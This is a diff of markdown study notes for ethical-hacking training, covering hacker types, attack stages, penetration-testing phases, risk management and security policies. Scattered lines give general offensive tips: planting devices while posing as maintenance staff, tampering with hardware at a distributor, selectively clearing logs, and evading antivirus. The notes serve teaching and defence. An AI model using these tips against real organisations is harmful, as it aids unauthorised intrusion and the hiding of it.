+  - [social engineering techniques](./../10-social-engineering/social-engineering-types.md) in early stages
+  - exploit tools at middle stages
+  - and software tools to clear logs to cover tracks at later stages.
+
+#### Procedures
+
+- Lower-level, highly detailed description in the context of a [technique](#techniques).
+- Sequence of actions done by attackers
+- E.g. an actor collects business e-mails of target company then launches a [spear phishing](./../10-social-engineering/social-engineering-types.md#spear-phishing) campaign
+
+#### Adversary behaviors
+
+- Method or techniques used by attacker to penetrate victim network.
+- E.g. using PowerShell, [DNS Tunneling](../11-firewalls-ids-and-honeypots/evading-firewalls.md#dns-tunneling), [Web Shell](../06-system-hacking/escalating-privileges.md#privilege-escalation-techniques) etc.
+
+#### Indicators of Compromise (IoCs)
+
+- Artifacts observed that indicates computer intrusion with high confidence.
+- 4 categories:
+  - **Email indicators**
+    - E.g. sender's email address, subject, attachment, links.
+  - **Network indicators**
+    - E.g. URLs, domain names, IP addresses, unusual DNS requests
+  - **Host-based indicators**
+    - E.g. filenames, file hashes, registry  keys, DDLs, mutex
+  - **Behavioral indicators**
+    - E.g. memory code injection, remote command execution, document execution PowerShell script.
 # Laws, standards, and regulations
 
 ## Legal systems
@@ -1035,258 +1622,154 @@
   - Gramm-Leach-Bliley Act
   - Requires financial institutions to take steps to protect customer information
 - **FERPA**: Education Records
-# Network security
+# Hacker types
 
-## Network security controls
+## Hacker
 
-- Include: Access control, Identification, Authentication, Authorization, Accounting, Cryptography, Security Policy
+- An individual who uses their computer and technical skills to gain access to systems and networks.
+- 🤗 A common theory is that a hacker meant initially anyone who possessed skills and knowledge and determination to solve problems in a creative way.
+  - There are arguments against it never was a benign term and the malicious connotations of the word were a later perversion is untrue.
 
-### Access control
+## Black hat hackers
 
-- Restrictions that determine who has access to what on a system/network.
-- **Physical access control**
-  - Restricts access to physical locations and buildings.
-- **Logical access control**
-  - Restricts the access to networks and information.
-- Terminology
-  - **Subject** = Who's reaching, user or process which accesses the objects
-  - **Object** = What's being reached, resources upon which the restrictions are placed
-  - **Operation** = Verb, What's being done, the action performed by the subject on the object
-  - **Reference Monitor** = implements the rules which define what actions on the object can a subject perform
-- Involves
-  - **Identification**: unique identity in any given system
-    - There are your credentials
-    - e.g. social security number, username and password.
-  - **Authentication**
-    - You're granted access via credentials
-    - You use the credentials
-  - **Authorization**:
-    - What you can access, where you can go, can you park somewhere
-  - **Accounting**
-    - Act of logging and creating account of all actions, what has been done.
+- 📝 Uses knowledge and skills to discover and exploit security vulnerabilities for financial gain or other malicious reasons
+- Bad guys
+- No regard of law & regulations etc.
+- Activities include stealing personal and financial information or shutting down websites and networks
+- E.g. bank robbing
 
-## Network security zoning
+## White hat hackers
 
-- Grouping networks for efficient management of networks.
-- Any network has physical firewalls (routers) which has software to act as firewall and control the traffic
-  - However it's hard to manage each network instead best to group them in zones and apply rules in that zone.
+- Also known as **ethical hackers**
+- 📝 Uses knowledge and skills to improve a system's security by discovering vulnerabilities before black hats do.
+- Will not break laws and regulations
+- Scope is determined by the client
+- E.g.
+  - Publish vulnerabilities
+  - Do penetration tests
+  - ❗Participate in bounty programs to claim rewards.
+    - Benefiting financially from hack is not illegal
 
-### Security zone
+### Ethical hacking
 
-- Group of similar people or systems by characteristics e.g. functionalities to apply same rules.
-- Properties include:
-  - Active security policies in regard to the network traffic
-    - E.g. to implement the policy "secretaries cannot reach twitter", can block those sites through firewall rule in their zone
-  - Detection and blocking of malicious traffic
-    - Software needs to actively scan and label what's malicious or not and stop malicious traffic
-  - List of known IP addresses and address sets
-    - IP address of device and interface are different
-  - List of the zone interfaces
-- A device or an interface can can have multiple IP addresses
-  - E.g. wired connection has one interface, another interface to connect to DB
-  - **Maintenance interface**
-    - Last resort to fix stuff
-    - Usually no security boundaries/guards on those interfaces
-    - Must have physical security
-    - E.g. someone goes in to server room in cold jacket codes, plugs in a laptop and uses maintenance interface to fix something.
+- Also known as white hat hacking
+- Performed by security specialists to help companies identify vulnerabilities in their networks and systems.
+  - Helps them analyzing and strengthening their system and network security
+  - Allows for creating preventive measures that should prevent any future security breaches as well as protect data and information stored in the system.
+- Difference from black-hat hacking:
+  - Hacking with permission of system owner
+  - They remain compliant to the law
+  - Purpose is to prevent hackers from breaking into systems and networks.
+- Flow
+  1. Find vulnerabilities
+  2. Assess problems & threats about them
+  3. Offer solutions e.g. you can do to fix this
+  4. Inform within the company
+- Ethical hackers should ask themselves when evaluating a system: (also companies asks often "why would we fix it?" in three questions)
+  - What is it that an attacker can see on this network/system?
+  - What could the attacker do with that knowledge?
+  - Are there any traces of attempted attacks on the system/network?
 
-### Zone examples
+### Ethical hacking scope
 
-- **Internet zone**
-  - Uncontrolled zone out of boundaries of an organization.
-- 📝 **DMZ Zone**
-  - Controlled zone.
-  - Also known as demilitarized zone
-  - Provides a barrier between the external and internal networks.
-  - Included in every router.
-  - Uses firewalls control what can go in and out.
-- **Production zone**
-  - Restricted zone.
-  - Firewalls are used to filter inbound and outbound traffic
-  - Access from uncontrolled networks is strictly controlled.
-- **Intranet zone**
-  - Controlled zone with less restrictions
-- **Management zone**
-  - Secured zone which enforces strict policies and limits access to a few authorized users.
-# Penetration testing phases
+- No test should be performed without appropriate permissions and authorization.
+- Test results should be kept confidential
+- Only those tests that the client requested should be performed
 
-## 1. Pre-Attack Phase
+## Grey hat hackers
 
-- Planning
-- Preparation
-- [Reconnaissance](./hacking-stages.md#1-reconnaissance)
+- Also known as ***grayhat***, ***gray hat***, ***gray-hat***, ***grey hat***, ***greyhat*** or ***grey-hat*** hackers.
+- 📝 Might break laws, regulations and ethical standards but do not have explicitly malicious indent.
+- Middleground; Not as bad as black, not as ethical as white hackers.
 
-### Contracts
+## Suicide hackers
 
-- Ethical hackers proceed only after an agreement is in place—to protect both parties.
-- **Non-disclosure agreement**
-  - Also known as **NDA**
-  - 📝 Prohibits you from sharing your findings
-- **Penetration testing contract**
-  - Should include all information and requirements that the penetration tester needs.
-  - Ensures the tester won't be sued or prosecuted and can legally perform an attack.
-    - as damage can incur during penetration testing
-- 💡 Good idea to go through those with a lawyer.
+- 📝 Perform attacks for a cause despite the risk of being caught and prosecuted.
+- E.g. they'll know for sure that they'll get caught but they still attempt the hack for a "cause".
 
-#### Rules of Engagement (ROE)
+## Script kiddies
 
-- Formal document that gives permission to perform a penetration test.
-- 📝 Guideline for testers and as such should clearly state what is and isn't allowed
-- E.g. which IP addresses should be tested, which hosts are not to be tested, which techniques, time frame when test can take place etc.
-. E.g. ok with SQL injection tests and brute force attacks but no DDoS attacks to not have service disruption or to not have network costs.
-- 🤗 Used also by armies, e.g. US army cannot fire on somebody unless they're firing on them.
+- 📝 Inexperienced hackers who don't have enough knowledge or skills to perform hacks on their own
+  - Instead, they use tools and scripts developed by more experienced hackers.
+- Dangerous because running the closed-sourced tools on one's own system is a big risk.
 
-### Understanding the clients requirements
+## Cyber terrorists
 
-- Pen-tester needs to understand the client's requirements.
-  - 💡 Also make sure client understands that themselves as well as they may not understand what they're asking you to do
-- Important for testers reputation and clients satisfaction.
-- 💡 Create checklists.
-  - Make suggestions
-  - Ensure everything is clear without loose ends
-  - Best to be clear as changing something during testing is not good as it would postpone the deadline and cost more for the client.
+- Money is not the priority, but to destroy stuff.
+- Influenced by religious or political beliefs.
+- 📝 Goal is to promote fear, unrest and disruption.
 
-### Defining the scope
+## State sponsored hackers
 
-- Ensures that requirements are fulfilled, and objectives are met.
-- Objectives should be determined first e.g.
-  - **Deliverables**: Different reports and often a final report where all results are placed and documented.
-  - **Functionality**: Verifies the system you're pen-testing is working as intended
-  - **Technical structure**: Design of the whole project
-  - **Data definition**
-- Defines areas/parts of the system that'll be tested e.g.:
-  - Network security
-    - E.g. check routers for faulty configurations, outdated operative systems.
-  - System software security
-  - Client-side application security
-  - Client-side to server-side communication security
-  - Server-side application security
-  - Document security
-  - Physical security
-    - E.g. how are people tracked? How is access granted and controlled? How are the access policies enforced?
-  - Application communication security
-  - [Dumpster diving](./../10-social-engineering/social-engineering-types.md#dumpster-diving)
-  - Insiders
-  - Sabotage intruder confusion
-  - Intrusion detection
-  - Intrusion response
-  - Social engineering
+- 📝 Recruited by governments
+- Gain access to classified information of other governments
+- Information source can be governments, individuals or corporations.
 
-### Information gathering
+## Hacktivists
 
-- To goal is to gather as much information about the target as possible
-- Information is used to map out the target's network and plan the attack.
-- See also [Reconnaissance | Hacking stages](./hacking-stages.md#1-reconnaissance) and [Footprinting](./../02-footprinting/footprinting-overview.md)
-- Information can include
-  - **Physical and logical locations**
-    - e.g. for servers
-  - **Analog connections**
-    - E.g. phones, GSM networks
-    - 🤗 You can create your own cellphone tower and take over their connections as you'll have the strongest signal.
-  - **Contact information**
-    - E.g. sitting in a near coffee to take photos and take names. You can then look at their contact information in list of employees (if publicly available somewhere). They become suspectable to social engineering.
-  - **Information about other organizations**
-    - 🤗 E.g. You can come with a rack suit to fix air-conditioning devices and say "hey there's a problem in air conditioning on floor 14" or "regular maintenance" or "one of your devices is due.". A security personal mey escort you but he won't watch everything carefully, you can place a Raspberry Pie and connect it to electricity. Refer to the following video: [Sneaking in EVERYWHERE for FREE (Yellow Vest Experiment)](https://www.youtube.com/watch?v=GyvRamX1VyA)
-      - Stupid and simple. Something too complex has higher risks of not working as the dumber it is, the simple it is, it'll probably work.
+- 📝 Break into government and corporate systems out of protest.
+- Promotes political or social agenda.
+- E.g. steal and leak data on public domain
+# Hacking stages
 
-## 2. Attack phase
+## 1. Reconnaissance
 
-- Phase where target gets compromised.
-- Information gathered in the previous one is used to carry out an attack.
-- Steps
-  1. [Penetrate the perimeter](#a-penetrating-the-perimeter)
-  2. [Acquire target](#b-target-acquisition)
-  3. [Escalate privileges](#c-privilege-escalation)
-  4. [Execute, implant, retract](#d-execute-implant-retract)
+- Also known as **footprinting**, **fingerprinting** or **information gathering**
+- 📝 Reconnaissance, *noun*, preliminary surveying or research about the target.
+- 📝 Necessary first step as an attack would not be successful without it.
 
-### a. Penetrating the perimeter
+## 2. Scanning
 
-- Trying to bypass IDS (Intrusion Detection System) and firewall
-- A way is to use social engineering to test out the boundaries and find a way into the system.
-- **Firewall testing** techniques include
-  - ICMP probes
-  - Checking access control
-  - Evaluating protocol filtering rules
-  - Evaluating IDS
-- Probing allow you to see what the perimeter detects & drops & won't detect
-  - You can craft own packets and see the reactions
-    - e.g. by modifying source/destination IPs
-  - E.g. check if certain port always drops, maybe port is open but only goes through the VPN where employees access network.
-- Figure out what devices are running under perimeter to select as a target.
-  - **Enumerate devices** collecting:
-    - ID of the device
-    - Description
-    - Hostname
-    - Physical location
-    - IP and MAC address
-      - 🤗 MAC address lets you know who the manufacturer is. Manufacturer information can give you idea of what kind of OS they run. You might get what devices they are running and how they are shipped. You can go to the distributor and put some physical keyloggers or sniffers e.g. a Raspberry Pi into a large router/switch.
-  - By cross checking them later again, it is possible to identify unauthorized devices.
+- Hacker utilizes information from previous stage to conduct more technical scan.
+- Often maps the routers and firewalls
+- Use tools such as port scanners, network mappers, vulnerability scanners, etc.
 
-### b. Target acquisition
+### Reconnaissance vs Scanning
 
-- Done after scanning and penetrating of the perimeter and selecting a target machine/device
-- Involves vulnerability scans to find vulnerabilities which can be later exploited
-- 📝 Includes:
-  - **Active probing assaults**
-    - Scanning the network and gathering more information
-  - **Running vulnerability scans**
-    - Completing vulnerability scans to see what vulnerabilities that the target has.
-  - **Attempt to access services and obtain data**
-    - Trusted systems and trusted process assessment
-    - Trying to access the resources on the system using the credentials obtained during the information gathering process
-      - E.g. using credentials that you have obtained through social engineering or general research of the company/system
-    - You attempt to access and extract as much as data as you can
-    - Pick-locking: try to unlock it in every possible way
+- In scanning you're acting on gathered information to gather information
+- Examples
 
-### c. Privilege escalation
+| [Reconnaissance](#1-reconnaissance) | [Scanning](#2-scanning) |
+| ------ | ----- |
+| Scan the perimeter network you need the IP addresses | Use e.g. `nmap` to figure out what the configuration is. |
+| Get e-mails. | Use phishing to gather personal data |
+| Learn where service physically are | Do dumpster diving |
 
-- 📝 Done once the access to the system is granted
-- Goal is to grant elevated access.
-- Techniques include
-  - **Password crackers**
-    - E.g. bruteforce, dictionary-based attack
-  - **Exploit vulnerabilities in a code** e.g.
-    - Poorly written security policies
-    - False code in the code / applications
-    - Web app version is not updated, there's a vulnerability in this version
-    - Use flaws in a system e.g. older version of OS.
-  - **[Trojans](./../07-malware/trojans.md)**
-  - **[Social engineering](./../10-social-engineering/social-engineering-overview.md)**
-    - E.g. you realized that there's no strict policy regarding e-mails. You send an e-mail for phishing scheme, gain more information when the person clicks on that link, you can then execute arbitrary code if e-mail client is old (unlikely).
-    - E.g. phone-call and ask what you need: works way more than it should
-- 🤗 A lot of companies have state-of-the-art perimeter
-  - inside perimeter they have very old equipment and OS
-  - they don't emphasize much on security interior as they do in external
-    - once you pass the perimeter, you're more likely to find something inside
-- Defenses include
-  - Running services with the least privileged accounts
-  - Implementing [multi-factor authentication/authorization](./identity-access-management-(iam).md#multi-factor-authentication-mfa)
+## 3. Gaining Access
 
-### d. Execute, implant, retract
+- Attack stage
+- Steps:
+  1. Find an entry point to the target OS or application on the system
+  2. Use it to perform the attack
+     - Hackers may escalate privileges to gain complete control over the system/network.
+- Examples:
+  - Password crack with brute-force or dictionary attack
+  - Exploit buffer overflow
+  - Session hijack
+  - DoS attacks
 
-- Involves compromising the system with code.
-- Techniques include
-  - [DoS, DDoS attacks](./../13-web-applications/denial-of-service.md)
-  - buffer overflows to execute arbitrary code.
-  - using [viruses](./../07-malware/viruses.md), [trojans](./../07-malware/trojans.md), rootkits
-  - installing [backdoor](./../07-malware/malware-overview.md#backdoor)s
-- Retract means being able to exit without leaving any traces behind
-  - Traces left behind can cause suspicions and in effect vulnerablities would be patched and you cannot gain access to the target machine back using the same method.
-  - Delete all the logs that indicates you existed to ensure persistent remote access.
-  - Good idea is to figure out their antiviruses, and test your execution in a VM with same antivirus and security measures to not get detected by a random scan.
-  - If alarm is raised, you might be detected, put it in the report and result of whether the flag was investigated.
+## 4. Maintaining Access
 
-## 3. Post-attack phase
+- Keeping admin/root privileges so hacker can continue using the system.
+  - After breaking into a system, you attempt to elevate privileges to do more.
+- Maintain persistent access, because your connection might break, then you start again
+- Can prevent other hackers from accessing the system by installing backdoors, rootkits, or trojans.
+- 💡 You can install tools to give you persistance access and gathers data to use compromise more such as keylogger.
+- 💡 You can use the machine as proxy so all traces are lead back to the proxy.
+  - You can minimize the risks being discovered this way.
+  - ❗ As pen-tester document those as you'll get other people in trouble
 
-- The tester restores the system to the pretest state.
-- ❗Don't leave your stuff be it accidentally or on purpose as it breaks the law either way.
-  - Examples
-    - Delete any malware/rootkit installed
-    - Recover all files that were deleted
-    - Reverse any elevated privileges.
-    - Restore network settings to its original state
-    - Remove created vulnerabilities and exploits
-- Documentation / clear log of activities, results and security flaws.
+## 5. Clearing tracks
+
+- Hackers do everything they can do to hide their activities
+- Goal is to maintain the access to the system but remain unnoticed in the process.
+  - If you're detected: the vulnerability will be patched and you'll lose access.
+- Vital to clear all tracks as fast as possible, or if it's possible generate none.
+- Activities:
+  - Clear certain entries in log files: Not all, or it'll be suspicious
+  - Masquerade your activities: Make them as similar as possible as legitimate activities
+    - E.g. a good keylogger masquerade itself behind legitimate activities
+      - Mimics other programs behavior by adding more behavior.
 # Penetration Testing
 
 - Simulating of an security attack to
@@ -1466,876 +1949,185 @@
 - Applies a lot of standards to comply.
 - They do much research and publish most.
 - E.g. • [NIST SP 800-53](./laws-standards-and-regulations.md#nist-sp-800-53) • [NIST definition of cloud computing](../16-cloud-computing/cloud-computing.md#nist-definition-of-cloud-computing)
-# Physical security
-
-- The protection of all assets of an organization from all sorts of threats and attacks.
-- Helps in
-  - Preventing unauthorized access to the system
-  - Preventing any kind of data manipulation and theft
-  - Protecting the system against malicious activities such as espionage, damage and theft
-  - Protecting employees and preventing social engineering attacks
-- Categories
-  - **Natural or environmental threats**
-    - E.g. flood, fire, earthquake, dust
-  - **Man-made threats**
-    - E.g. Terrorism, wars, explosions, [dumpster diving](./../10-social-engineering/social-engineering-types.md#dumpster-diving) and theft, vandalism.
-- See also [Physical security | Social engineering](./../10-social-engineering/social-engineering-overview.md#physical-security)
-
-## Types of physical security controls
-
-### Preventive controls
-
-- Implemented before a threat event to reduce or avoid its impact.
-- Includes access control mechanisms to prevent access
-- Can be **technical** e.g.
-  - Firewalls
-  - Authentication systems.
-- Can be **administrative** e.g.
-  - Security policies
-- 📝 Can be **physical** e.g.
-  - Fire extinguishers
-  - Doors e.g.
-    - **Mantrap**
-      - Also known as air lock, sally port or access control vestibule
-      - Has two doors, each door requiring a separate form of authentication to open
-    - **Turnstile**
-      - Also known as a turnpike, baffle gate, automated gate
-      - Allows one person to pass at a time, can enforce one day direction
-      - Can require a a coin, a ticket, a pass, or similar
-      - E.g. in train stations
-  - **Bollard**
-    - Sturdy, short, vertical post
-    - Used for control road traffic and posts
-    - Allows to prevent ram-raiding and vehicle-ramming attacks.
-    - 🤗 Used initially for mooring boats
-
-#### Static electricity
-
-- Low humidity can cause a buildup of static electricity.
-  - Leads to corrosion of the components could.
-  - 💡 Keep humidity level between 45% and 55%.
-- Grounding systems help
-  - E.g. antistatic wrist straps are designed to ground people appropriately
-  - Provides somewhere for any latent static electricity generated to flow.
-
-### Detective controls
-
-- In place to let you know when something has happened or is happening.  
-- Detects violations and intrusion attempts for investigation.
-- E.g. • audit trails and logging • alarm systems • sensors • video surveillance • motion detectors.
-
-### Deterrent controls
-
-- Also known as **deterrence controls**
-- Warns intruders to stay away
-- E.g. signs showing • "Be aware of the dog" • "Under surveillance" • "Authorized personal only"
-
-### Recovery controls
-
-- Used after violation has happened to restore the system to its persistent state
-- E.g. backup systems and disaster recovery
-
-### Compensation controls
-
-- Do not prevent attacks, used when everything else fails
-- Goal is to restore everything back to normal
-- E.g. when there's power shortage you need a grid, alternative energy backing: generators, batteries..
-
-## Physical security measures
-
-- Secure premises and company surroundings
-- Secure the reception area
-- Lock servers and workstations when not in use
-- Lock devices such as modems, removable media, and fax machines when not in use
-- Implement access control
-- Regularly maintain computer equipment
-- Prevent wiretapping
-- Monitor the environment by checking the humidity and temperature
-- Positive pressure is great at keeping contaminants (e.g. dust, dirt) out of the data center
-# Risk management
-
-- Ongoing process of identifying, assessing and acting on potential risks.
-- ❗📝 Risk management controls reduce risks but one can never fully eliminate all risk
-  - Nothing is 100% risk-free.
-
-## Risk
-
-- **Risk**
-  - Threat of damage or loss
-- **Risk mitigation**
-  - Also known as **risk reduction**
-  - Taking action to reduce an organization's exposure to potential risks and reduce the likelihood that those risks will happen again.
-- 📝 **Risk equation**
-  - `Risk = Threat x Vulnerability x Asset`
-  - E.g. network is very vulnerable (no firewall), asset is critical: high risk.
-  - E.g. network is well protected, asset is critical: medium risk
-- 📝 **Likelihood**
-  - Likelihood is how probable it is that an event will occur
-- 📝 **Impact**
-  - Estimate of the harm that could be caused by an event
-
-### Types of risks
-
-- 📝 **Inherent risk**
-  - Represents the amount of risk that exists before any controls are taken.
-  - Raw and untreated risk
-- 📝 **Residual risk**
-  - Amount of risk that remains after controls are accounted for.
-- **Control risks**
-  - Risks that occur due to weaknesses in internal controls
-- **Audit risk**
-  - Risk of error while performing an audit.
-  - Three types: Control risk, detection risk, inherent risk
-- **Detection risk**
-  - Verifier does not detect a material misstatement
-
-### Level of risk
-
-- Defined based on events possible consequences to evaluate.
-- **Level of risk equation**
-  - `Consequence x Likelihood`
-
-  | Risk Level | Consequence | Action |
-  | ---------- | ----------- | ------ |
-  | **Extreme / high** | Serious danger | Measures should be immediately taken to reduce the risk |
-  | **Medium** | Medium danger | Measures should be taken as soon as possible |
-  | **Low** | Negligible danger | Preventive measures should be taken to mitigate the risk |
-
-### Risk matrix
-
-- Used to visualize risk probabilities and its consequences
-- Most used method in risk analysis
-- ![Standard risk matrix](img/risk-matrix.png)
-
-### Risk assessment
-
-- 📝 Prioritizes risks based on severity and likelihood of occurrence
-- 📝 Includes an analysis of threats based on the impact to the business
-- E.g. [HIPAA security risk assessment tool](https://www.healthit.gov/topic/privacy-security-and-hipaa/security-risk-assessment-tool) to assess risks regarding: • administrative safeguards • technical safeguards • physical safeguards as defined in [HIPAA rules](./laws-standards-and-regulations.md#hipaa-rules).
-- 💡 Risk assessor should be a trusted entity or contractor
-  - As they'll receive detailed vulnerability information and security architecture information
-
-## Risk management objectives
-
-- Identify the potential risks
-- Identify the impacts of those risks
-- Create risk management strategy and plan
-- Assign priorities to risks
-- Analyze the risks
-- Control the risk
-  - e.g. education, enforcing a policy, changing a software etc..
-- Develop strategies and plans for long lasting risks
-
-## Risk management phases
-
-1. 📝 **Identification**
-   - What? Why? Consequences?
-   - Data gathering activities include • threat identification • vulnerability identification • risk control analysis
-     - Read more [NIST SP 800-39 (NIST Cybersecurity Framework)](https://www.nist.gov/privacy-framework/nist-sp-800-39)
-2. **Assessment**
-   - Likelihood and impact
-3. **Treatment**
-   - Prioritize, order and document.
-   - Manage risks through [risk response types](#risk-responses)
-4. **Tracking and review**
-   - Ensures right actions were taken.
-   - Is action obsolete? Can it be improved? Can cost be decreased?
-
-## Risk responses
-
-- 📝 5 risk responses are: • Avoid • Mitigate • Transfer • Accept • Share
-- **Avoid**
-  - Change the strategy/plan to avoid the risk.
-- **Mitigate**
-  - Take action to reduce the risk.
-  - 💡 You should mitigate the risk to a low enough level so that the residual risk can be accepted as you will never be able to remove all risks.
-- **Transfer**
-  - Transfer risk to another party by e.g. outsourcing or purchasing an insurance.
-- **Accept**
-  - Decide to take the risk, as without risk there's no movement/rewards.
-- **Share**
-  - Distributing the risk, e.g. having two security architects so service can continue if one quits.
-
-## Business continuity and disaster recovery (BCDR)
-
-1. **Risk assessment**
-   - Preparing risk analysis and business impact analysis
-   - See also [risk assessment](#risk-assessment)
-   - E.g. **Disaster recovery risk assessment**
-     - Describes potential risks and their impact to the functioning of an organization.
-     - Describes both natural and man-made disasters and estimates the probability of each scenario occurring
-   - **Business impact analysis (BIA)**
-     - Predicts the consequences of disruption of a business function
-     - Process and gathers information needed to develop recovery strategies
-     - Often includes [Annualized Loss Expectancy (ALE)](#annualized-loss-expectancy-ale) metrics.
-     - Should be used identifying the potential consequences of a change, or estimating what needs to be modified to accomplish a change
-     - 📝 **Business change impact analysis**
-       - Allows you to identify consequences of a change
-       - E.g. a new feature can cause resource load and crash the server.
-2. **Business continuity plan (BCP)**
-   - Covers critical processes recovery
-   - 📝 Includes **Disaster recovery plan (DRP)** describing:
-     - How an organization can quickly resume work after an unplanned incident
-     - What to do to recover
-
-## Annualized Loss Expectancy (ALE)
-
-- Annual cost of a loss due to a risk.
-- Used often in risk analysis and business impact analysis
-- 📝 `ALE = ARO (Annual rate of occurrence) x SLE (Single loss expectancy)`
-- **Annual rate of occurrence (ARO)**
-  - E.g. if it occurs every month than it's 12, if it's every second year than it's 1/2
-- **Single loss expectancy (SLE)**
-  - Total loss value for a single asset after an exploit
-  - `SLE (Single Loss Expectancy) = AV (Asset Value) x EF (Exposure Factor)`
-  - **Asset value (AV)**
-    - How much would it take to replace 1 asset
-    - Including product prices, manhours etc.
-  - **Exposure Factor (EF)**
-    - Percentage of asset value lost if threat is realized
-    - Usually a subjective value
-- E.g. an asset is valued at $100,000, and the Exposure Factor (EF) for this asset is 25%. The single loss expectancy (SLE) then, is 25% * $100,000, or $25,000.
-- **Total cost of ownership (TCO)**
-  - Total cost of a mitigating safeguard
-- **Return on Investment (ROI)**
-  - Amount of money saved by implementing a safeguard.
-  - 💡 Good choice if annual Total Cost of Ownership (TCO) is less than Annualized Loss Expectancy (ALE); poor choice otherwise
-
-## Threat modeling
-
-- Assessment to see how secure an application is
-  - identify the threats
-    - can e.g. use [OWASP top 10](https://owasp.org/www-project-top-ten/) as guideline.
-  - discover application vulnerabilities
-  - improve security
-    - e.g. configure in better way, improve source code, enable encryption or ditch the application.
-- 💡 Do it as soon as and often as possible
-  - E.g. by design phase of the software security development lifecycle (SDL) process
-
-### Threat modeling steps
-
-1. **Identify security objectives**
-   - Understand your integrity, confidentiality, and availability goals
-2. **Application overview**
-   - Understand application and its components (libraries and services), data flows and trust boundaries.
-3. **Decompose application**
-   - Document what each component does, entry and exit points, data flows and trust boundaries.
-4. **Identify threats**
-   - Done for each individual components
-   - E.g. a misconfiguration (e.g. bad password policy, outdated encryption)
-5. **Identify vulnerabilities**
-   - End with vulnerabilities, overall assessment, prioritization of risks.
-
-## Security Development Lifecycle (SDL)
-
-- Set of guidance, best practices, tools, and processes by Microsoft
-- Consists of different phases with different actions on each phase:
-  1. **Training**
-     - Core security training for developers
-  2. **Requirements**
-     - Setting level of security desired
-  3. **Design**
-     - [Threat modeling](#threat-modeling)
-     - Attack surface analysis
-     - Requirements
-  4. **Implementation**
-     - Static analysis
-     - Turning off unsafe functions
-  5. **Verification**
-     - Dynamic analysis
-     - [Fuzz testing](./../14-sql-injection/sql-injection-overview.md#fuzz-testing)
-     - Attack surface reviews
-  6. **Release**
-     - Incident response plan
-     - Final security review
-     - Certification
-  7. **Response**
-     - Allow reporting security problems in products
-# Security policies
-
-- Rules and requirements that the system has to have to achieve information assurance.
-- Defines everything about your layout for the employees
-- Written documents including
-  - Lists of allowed hardware and software
-  - Locations for related policies and procedures
-  - Exceptions i.e. exemption rules
-  - Sanctions for noncompliance e.g. disciplinary actions/punishment/termination
-  - ...
-- Types
-  - **Technical policies**: define the system configuration
-  - **Administrative policies**: define the behavior of employees
-- Mitigates risks, prevents something costly from happening.
-- E.g. a good policy is NDA, distributed and cannot be repudiated (signed)
-
-## Policy types for risk tolerance
-
-- 📝 From most permissive to most strict
-  1. [Promiscuous](#promiscuous-policy): No restrictions
-  2. [Permissive](#permissive-policy): If something is malicious it's blocked.
-  3. [Prudent](#prudent-policy): Restrictive
-  4. [Paranoid](#paranoid-policy): Highest restrictions
-
-### Promiscuous policy
-
-- No restrictions on system resources.
-- Do whatever you want
-- 💡 Only good when you have bunch of highly trained & well-informed people with proven track record working in a team because otherwise policies would slow them down
-
-### Permissive policy
-
-- Begins as wide-open, can do anything
-- When it knows something is malicious, it'll be blocked
-
-### Prudent policy
-
-- Provides maximum amount of security
-- Allows only safe stuff
-- Very restrictive
-- A lot of things are locked up
-
-### Paranoid policy
-
-- Something of such high importance, not worth to take smallest of risks, e.g. government data regarding to citizens
-  - E.g. access only from police station, they need to submit why they access, lethal data
-- 🤗 In Linux firewall there's a command called panic that's equivalent to this: Drops all traffic
-
-## Sub-policies
-
-- Policy types are not limited to the listed.
-
-### Password policy
-
-- Guidelines for using strong password protection on available resources.
-- E.g.
-  - At least 8 characters in length
-  - Must include upper/letter/number/symbols
-
-### User account policy
-
-- 📝 Defines the account creation process, authority, rights and responsibility of user accounts.
-- E.g.
-  - Put users in groups and decides what the groups can do.
-  - What needs to be done during account creation
-
-### Information protection policy
-
-- 📝 Guidelines to users on the processing, storage and transmission of sensitive information
-- Goal is to ensure information is appropriately protected from modification or disclosure
-- E.g.
-  - Setting level of sensitivity to information
-  - Dictates who has access to information
-  - Determines how information is stored and transmitted
-  - Describes how information should be deleted from storage media
-
-### Special access policy
-
-- Custom rulings for specific scenarios for specific individuals and services
-- The terms and conditions of granting special access to system resources.
-
-### Email security policy
-
-- Governs the proper usage of corporate email.
-- E.g.
-  - Verify proper signature
-  - Never click on links, because they'll never be sent
-
-### Acceptable use policy
-
-- Same as **Terms of Service** or **Terms of Use**
-- 📝 Description of what constitutes acceptable and unacceptable use of the Internet
-- Code of conduct governing the behavior of a user whilst connected to the network/Internet.
-- E.g.
-  - ISP providers allows you to use unlimited bandwidth
-    - In contract you see it says it's about "fair use"
-    - Fair use can be e.g. to not exceed 50% maximum potential bandwidth that could be used with that bandwidth
-  - Prohibiting port scanning or security scanning
-  - Never revealing a password
-
-### Access control policy
-
-- 📝 Governs resources being protected and the rules that control access to them
-- Who can access what (humans <-> services)
-  - E.g. limited access to routers and switches on top floor
-  - E.g. regulating electric socket placement as someone can connect a Raspberry Pi that can be listening
-- What can access what (services <-> services)
-
-### Remote access policy
-
-- 📝 Defines acceptable methods of remotely connecting to the internal network
-- Applies to both who and what
-- E.g. enforcing VPN, strong passphrases, defining vendor access and requiring monitoring
-
-### Firewall management policy
-
-- Governs access, management and monitoring of firewalls in an organization.
-- Who'll monitor? How will it be monitored?
-- What kind of firewall that'll be used?
-
-### Network connection policy
-
-- Defines who can install new resources on the network, approve the installation of new devices, document network changes etc.
-- Protects both yourself and the company
-- E.g. must always use VPN if not working from office
-
-### Network security policy
-
-- 📝 Outlines rules for computer network access, determines how policies are enforced
-- Governs e.g. • data access • web-browsing habits • use of passwords and encryption • email attachments.
-
-### Encryption policy
-
-- Dictates which encryption to use
-- Goal is to avoid weak and obsolete algorithms
-- Easier if everyone uses same algorithm
-- Used by e.g. cloud providers, ISP providers
-
-### Authentication policy
-
-- Limits ability to be authenticated under some conditions
-- E.g. no coffee shop wireless, only through VPN and using [MFA](identity-access-management-(iam).md#multi-factor-authentication-mfa)
-
-## Implementation
-
+# Penetration testing phases
+
+## 1. Pre-Attack Phase
+
+- Planning
+- Preparation
+- [Reconnaissance](./hacking-stages.md#1-reconnaissance)
+
+### Contracts
+
+- Ethical hackers proceed only after an agreement is in place—to protect both parties.
+- **Non-disclosure agreement**
+  - Also known as **NDA**
+  - 📝 Prohibits you from sharing your findings
+- **Penetration testing contract**
+  - Should include all information and requirements that the penetration tester needs.
+  - Ensures the tester won't be sued or prosecuted and can legally perform an attack.
+    - as damage can incur during penetration testing
+- 💡 Good idea to go through those with a lawyer.
+
+#### Rules of Engagement (ROE)
+
+- Formal document that gives permission to perform a penetration test.
+- 📝 Guideline for testers and as such should clearly state what is and isn't allowed
+- E.g. which IP addresses should be tested, which hosts are not to be tested, which techniques, time frame when test can take place etc.
